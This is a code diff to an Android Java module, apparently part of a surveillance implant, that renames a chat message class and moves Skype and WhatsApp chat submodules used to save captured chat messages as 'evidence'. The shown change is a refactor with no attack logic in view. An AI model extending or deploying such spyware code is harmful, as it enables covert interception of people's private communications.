@@ -43,9 +43,9 @@ import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
-import com.android.networking.module.chat.ChatMessage;
-import com.android.networking.module.submodule.ChatSkype;
-import com.android.networking.module.submodule.ChatWhatsapp;
+import com.android.networking.module.chat.MessageChat;
+import com.android.networking.module.chat.ChatSkype;
+import com.android.networking.module.chat.ChatWhatsapp;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DateTime;
@@ -109,13 +109,13 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		ListenerProcess.self().detach(this);
 	}
 
-	public void saveEvidence(ArrayList<ChatMessage> messages) {
+	public void saveEvidence(ArrayList<MessageChat> messages) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveEvidence)");
 		}
 
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
-		for (ChatMessage message : messages) {
+		for (MessageChat message : messages) {
 			DateTime datetime = new DateTime(message.timestamp);
 
 			// TIMESTAMP
